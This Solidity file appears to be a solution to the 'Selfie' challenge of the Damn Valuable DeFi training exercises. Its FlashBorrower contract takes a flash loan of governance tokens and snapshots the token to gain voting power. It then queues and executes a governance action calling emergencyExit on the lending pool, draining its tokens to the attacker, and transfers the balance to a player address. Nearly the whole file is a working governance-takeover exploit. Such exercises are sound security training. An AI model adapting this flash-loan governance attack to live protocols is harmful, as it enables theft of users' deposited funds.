// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "../DamnValuableTokenSnapshot.sol";
import "./SelfiePool.sol";
import "hardhat/console.sol";

contract FlashBorrower is IERC3156FlashBorrower {

    uint256 public actionId;
    SelfiePool public lender;
    ISimpleGovernance public governance;
    DamnValuableTokenSnapshot public dvtToken;

    constructor(address _lender, address _governance, address _token) {
        lender = SelfiePool(_lender);
        governance = ISimpleGovernance(_governance);
        dvtToken = DamnValuableTokenSnapshot(_token);
    }

    /// @dev ERC-3156 Flash loan callback
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external override returns (bytes32) {
        require(msg.sender == address(lender), "FlashBorrower: Untrusted lender");
        require(initiator == address(this), "FlashBorrower: Untrusted loan initiator");

        // silence warning about unused variable without the addition of bytecode.
        token;
        amount;
        fee;

        // Your logic goes here. Do whatever you want with the tokens
        
        if (actionId==0) {
            // (string memory funcSig,address playerAddress)= abi.decode(data, (string,address));
            // bytes memory actionData = abi.encodeWithSignature(funcSig, playerAddress);
            dvtToken.snapshot();
            actionId = governance.queueAction(address(lender), 0, data);
        } else{
            console.log("actionId: ", actionId);
            governance.executeAction(actionId);
            actionId = 0;
        }

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    /// @dev Initiate a flash loan
    function flashBorrow(address _token, uint256 amount) public {
        //bytes memory data = abi.encode(Action.NORMAL);
        console.log("Entered FlashBorrow");
        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", address(this));

        uint256 _allowance = IERC20(_token).allowance(address(this), address(lender));
        uint256 _fee = lender.flashFee(_token, amount);
        uint256 _repayment = amount + _fee;
        IERC20(_token).approve(address(lender), _allowance + _repayment);
        lender.flashLoan(this, _token, amount, data);
    }

    function drainRemainingToken() public {
        if (actionId==0) {
            bytes memory data = abi.encodeWithSignature("emergencyExit(address)", address(this));
            dvtToken.snapshot();
            actionId = governance.queueAction(address(lender), 0, data);
        } else {
            console.log("Final actionId: ", actionId);
            governance.executeAction(actionId);
        }
    }

    function transferBalance(address player) public{
        console.log("FinalBalanceOfBorrower : ", dvtToken.balanceOf(address(this)));
        dvtToken.transfer(player, dvtToken.balanceOf(address(this)));
    }
}
